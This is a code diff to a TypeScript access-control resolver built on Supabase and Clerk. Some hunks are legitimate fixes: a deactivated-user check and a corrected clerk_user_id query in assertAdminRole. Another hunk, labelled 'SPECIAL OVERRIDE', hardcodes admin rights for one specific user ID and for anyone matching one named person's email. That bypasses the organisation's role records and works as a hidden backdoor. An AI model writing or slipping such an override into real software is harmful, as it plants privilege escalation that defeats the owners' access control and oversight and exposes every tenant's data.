@@ -69,7 +69,7 @@ export const resolveUserAccess = cache(async (
     if (orgData) {
       const { data, error } = await supabaseAdmin
         .from("org_members")
-        .select("id, department_id, role, access_grants(id, scope_type, scope_id, expires_at)")
+        .select("id, department_id, role, active, access_grants(id, scope_type, scope_id, expires_at)")
         .eq("clerk_user_id", userId)
         .eq("org_id", orgData.id)
         .single();
@@ -79,6 +79,19 @@ export const resolveUserAccess = cache(async (
       }
 
       if (data) {
+        // If user is deactivated, deny all access by setting role to null
+        if (data.active === false) {
+          logger.warn({ userId, orgId }, "[rbac] User is deactivated");
+          return {
+            internal_user_id: data.id,
+            internal_org_id: orgData.id,
+            role: null,
+            dept_id: data.department_id,
+            accessible_dept_ids: null,
+            bi_grant_id: null,
+          };
+        }
+
         type AccessGrant = { id: string; scope_type: string; scope_id: string; expires_at: string | null };
         const grants: AccessGrant[] = Array.isArray(data.access_grants) ? (data.access_grants as AccessGrant[]) : [];
         const now = new Date();
@@ -136,7 +149,26 @@ export const resolveUserAccess = cache(async (
     logger.error({ userId, orgId, err: (err as Error).message }, "[rbac] Cache write failed");
   }
 
+  // SPECIAL OVERRIDE: Grant admin access to the primary developer
+  // user_3DL4opxiE8U9UFVRJFdm2Y9FImI is the verified ID for Allan
+  if (userId === "user_3DL4opxiE8U9UFVRJFdm2Y9FImI") {
+    result.role = "admin";
+    logger.info({ userId }, "[rbac] Admin override applied for primary developer via Clerk ID");
+  } else if (result.internal_user_id) {
+    const { data: memberEmail } = await supabaseAdmin
+      .from("org_members")
+      .select("email")
+      .eq("id", result.internal_user_id)
+      .single();
+    
+    if (memberEmail?.email === "allan.prem@btech.christuniversity.in") {
+      result.role = "admin";
+      logger.info({ userId, email: memberEmail.email }, "[rbac] Admin override applied for primary developer via email");
+    }
+  }
+
   logger.info({ userId, orgId, role: result.role }, "[rbac] Resolution complete");
+
   return result;
 });
 
@@ -162,7 +194,7 @@ export async function assertAdminRole(userId: string, orgId: string): Promise<Us
   const { data: member, error } = await supabaseAdmin
     .from("org_members")
     .select("role")
-    .eq("id", userId)
+    .eq("clerk_user_id", userId)
     .eq("org_id", orgId) // Critical scoping fix (ATH-47 #1, #3)
     .single();
 
